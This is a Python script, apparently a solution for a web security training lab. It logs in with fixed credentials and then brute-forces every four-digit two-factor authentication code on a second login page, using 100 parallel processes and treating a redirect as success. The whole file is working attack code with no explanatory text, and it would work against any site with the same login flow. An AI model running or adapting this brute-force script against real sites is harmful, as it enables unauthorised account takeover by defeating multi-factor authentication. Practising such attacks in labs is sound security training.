import sys
import requests
import time
import multiprocessing
from bs4 import BeautifulSoup
site = sys.argv[1]

if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')


def getCode(i):
    #first login page login
    s = requests.Session()
    login_url = f'https://{site}/login'
    resp = s.get(login_url)
    soup = BeautifulSoup(resp.text,'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')
    logindata = {
        'csrf' : csrf,
        'username' : 'carlos',
        'password' : 'montoya'
    }
    print(f'Logging in as carlos:montoya')
    resp = s.post(login_url, data=logindata)
    print(f'Login response: {resp.text}')

    #second login page login
    soup = BeautifulSoup(resp.text,'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')
    login2_url = f'https://{site}/login2'
    login2data = {
        'csrf' : csrf,
        'mfa-code' : str(i).zfill(4)
    }
    resp = s.post(login2_url, data=login2data, allow_redirects=False)
    print('mfacode:')
    print(login2data['mfa-code'])

    if resp.status_code == 302:
        print(f'2fa valid with response code {resp.status_code}')
        # Visit account profile page to complete level
        print('SUCCESS')
        print(login2data['mfa-code'])
        return login2data['mfa-code']
            
    else:
        print(f'2fa invalid with response code: {resp.status_code}')
        return 0

def getMulti(num_processes):
    rangeList = []
    start = 0
    end = 100
    #populate list with ranges[ [0-99],[100-199]...[9000-9999] ]
    for i in range(0,100):
        rangeList.append(list(range(start,end)))
        start = end
        end = end+100
    #loop through list of ranges
    for i in rangeList:
        p = multiprocessing.Pool(num_processes)
        respStatus = p.map(getCode,i)
        #loop through array of getCode() return values to find correct 'mfa-code:' 
        for j in respStatus:
            print('checking..')
            print(j)
            if (j!=0):
                print('HERE IS CODE:')
                print(j)
                exit()
    p.close()
    
if __name__ == '__main__':
    c = 100
    #get array of ret values returned by gelMulti (should have a single '302' value, the rest 0's)
    code = getMulti(c)
    
    